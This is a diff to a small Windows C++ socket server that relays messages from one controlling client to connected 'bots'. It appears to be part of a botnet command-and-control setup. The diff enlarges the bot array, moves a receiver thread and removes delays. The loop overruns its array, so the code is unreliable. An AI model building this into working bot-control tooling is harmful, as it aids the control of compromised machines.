@@ -8,7 +8,7 @@
 
 using namespace std;
 
-SOCKET sock, sListen, Con[100];
+SOCKET sock, sListen, Con[256];
 SOCKADDR_IN addr;
 
 HANDLE hThread, hThreadB, hThreadC;
@@ -38,7 +38,7 @@ void listen()
 	listen(sListen, SOMAXCONN);
 }
 
-
+DWORD WINAPI reces(LPVOID d);
 
 DWORD WINAPI inff(LPVOID g)
 {
@@ -65,6 +65,7 @@ DWORD WINAPI inff(LPVOID g)
 			cout << "4" << endl;
 			Sleep(1000);
 			cout << "Client connected" << endl;
+			hThreadB = CreateThread(NULL, NULL, reces, NULL, NULL, &IDThread);
 		}
 		else { Con[d] = sock; d++; cout << "Bot" << d << " connected to middler." << endl; cout << "5" << endl; Sleep(1000);
 		}
@@ -100,20 +101,20 @@ t7:
 			while (i <= 256)
 			{
 				cout << "11" << endl;
-				Sleep(1000);
+				//Sleep(1000);
 				send(Con[i], msg, sizeof(msg), NULL);
 				cout << "12" << endl;
-				Sleep(1000);
+				//Sleep(1000);
 				closesocket(Con[i]);
-				Sleep(1000);
+				//Sleep(1000);
 				cout << "13" << endl;
-				Sleep(1000);
-				Sleep(1);
+				//Sleep(1000);
+				Sleep(100);
 				cout << "14" << endl;
-				Sleep(1000);
+				//Sleep(1000);
 				i++;
 				cout << "15" << endl;
-				Sleep(1000);
+				//Sleep(1000);
 			}	
 			
 			i = 1;
@@ -140,8 +141,7 @@ int main()
 	setaddr();
 	listen();
 	hThread = CreateThread(NULL, NULL, inff, NULL, NULL, &IDThread);
-	hThreadB = CreateThread(NULL, NULL, reces, NULL, NULL, &IDThread);
-
+	
 	WaitForSingleObject(hThread, INFINITE);
 	WaitForSingleObject(hThreadB, INFINITE);
 	//WaitForSingleObject(hThreadC, INFINITE);
